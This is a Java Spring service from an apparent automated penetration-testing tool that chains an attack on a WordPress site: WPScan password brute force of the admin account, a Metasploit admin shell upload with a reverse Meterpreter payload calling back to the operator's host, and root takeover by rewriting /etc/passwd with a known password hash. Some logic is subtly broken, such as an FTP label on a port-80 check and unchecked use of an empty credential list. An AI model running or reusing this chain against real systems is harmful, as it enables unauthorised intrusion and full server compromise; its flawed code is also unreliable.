package org.penforge.backend.pentestScenarios;

import lombok.AllArgsConstructor;
import org.penforge.backend.pentestRecon.PentestReconService;
import org.penforge.backend.pentestReport.Credentials;
import org.penforge.backend.pentestReport.PentestReport;
import org.penforge.backend.pentestReport.PentestReportRepository;
import org.penforge.backend.pentestReport.PortData;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
@AllArgsConstructor
public class WPAttackService {

    private final PentestReconService pentestReconService;
    private final PentestReportRepository pentestReportRepository;

    public String isPortOpen(String targetIp, String userId) throws Exception {
        List<PortData> portDataList = pentestReconService.runNmap(targetIp);
        boolean isFtpPortOpen = portDataList.stream().anyMatch(portData -> portData.getPort().equals("80/tcp") && portData.getPortState().equals("open"));

        if (isFtpPortOpen) {
            return performWPAttack(targetIp, userId, portDataList);
        } else {
            throw new IllegalArgumentException("FTP port is not open on target IP");
        }
    }

    public String performWPAttack(String targetIp, String userId, List<PortData> portDataList) {
        List<Credentials> credentialList = new ArrayList<>();
        boolean rootShellAccess = false;

        String passwordsPath = "/home/order6tyfix/passwords.txt";

        try {
            // Get the LHOST dynamically
            String lhost = getLhost();

            // 1. WPScan Kullanarak Brute-Force Attack
            String wpscanCommand = String.format("wsl wpscan --url http://%s/secret --usernames admin --passwords %s --format cli-no-color", targetIp, passwordsPath);
            String wpscanOutput = executeCommand(wpscanCommand);
            credentialList = extractCredentials(wpscanOutput);
            if (credentialList.isEmpty()) {
                System.out.println("No valid credentials found");
            }

            // Assume the first credential is valid for simplicity
            String username = credentialList.get(0).getUsername();
            String password = credentialList.get(0).getPassword();

            // 2. Metasploit Kullanarak Exploit
            String metasploitCommand = String.format(
                    "wsl msfconsole -q -x \"use exploit/unix/webapp/wp_admin_shell_upload; " +
                            "set USERNAME %s; set PASSWORD %s; set RHOSTS %s; set LHOST %s; " +
                            "set LPORT 4444; set PAYLOAD php/meterpreter_reverse_tcp; set TARGETURI /secret; exploit; exit -y\"",
                    username, password, targetIp, lhost
            );

            String metasploitOutput = executeCommand(metasploitCommand);

            // 3. Privilege Escalation
            String uploadCommand = "wsl msfconsole -q -x \"meterpreter > upload /usr/bin/unix-privesc-check /tmp/unix-privesc-check; exit -y\"";
            String privilegeCheckCommand = "wsl msfconsole -q -x \"meterpreter > shell ./unix-privesc-check standard | grep WARNING; exit -y\"";

            executeCommand(uploadCommand);
            String privilegeCheckOutput = executeCommand(privilegeCheckCommand);

            if (privilegeCheckOutput.contains("/etc/passwd")) {
                executePrivilegeEscalation(targetIp);
                rootShellAccess = true;
            } else {
                System.out.println("No privilege escalation vulnerability found");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        PentestReport report = PentestReport.builder()
                .userId(userId)
                .id(UUID.randomUUID().toString())
                .targetIP(targetIp)
                .targetService("http")
                .targetPort(80)
                .scanDate(new Date())
                .credentials(credentialList)
                .portData(portDataList)
                .rootShellAccess(rootShellAccess)
                .build();

        pentestReportRepository.save(report);

        return report.getId();
    }


    private List<Credentials> extractCredentials(String output) {
        List<Credentials> credentialList = new ArrayList<>();
        Pattern pattern = Pattern.compile("\\| Username: (\\S+), Password: (\\S+)");
        Matcher matcher = pattern.matcher(output);

        while (matcher.find()) {
            credentialList.add(Credentials.builder()
                    .username(matcher.group(1))
                    .password(matcher.group(2))
                    .build());
        }
        return credentialList;
    }

    private void executePrivilegeEscalation(String targetIp) throws Exception {
        // Password hash creation using openssl
        String hash = executeCommand("wsl openssl passwd -1 12345").trim();

        // Edit passwd file and replace root password
        String replaceCommand = String.format("wsl sed -i 's/^root:.*$/root:%s:0:0:root:/root:/bin/bash/' /etc/passwd", hash);
        executeCommand("wsl msfconsole -q -x \"meterpreter > shell " + replaceCommand + "; exit -y\"");

        // Gain root access
        executeCommand("wsl msfconsole -q -x \"meterpreter > shell su root -l; meterpreter > shell Password: 12345; exit -y\"");
    }

    private String executeCommand(String command) throws Exception {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd.exe", "/c", command);

        Process process = processBuilder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

        int exitCode = process.waitFor();
        if (exitCode != 0) {
            throw new RuntimeException("Command execution failed: " + command);
        }

        return output.toString();
    }


    private String getLhost() throws Exception {
        String command = "wsl ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}'";
        String output = executeCommand(command);
        return output.split("\\s+")[0].trim(); // Get the first IP address
    }

}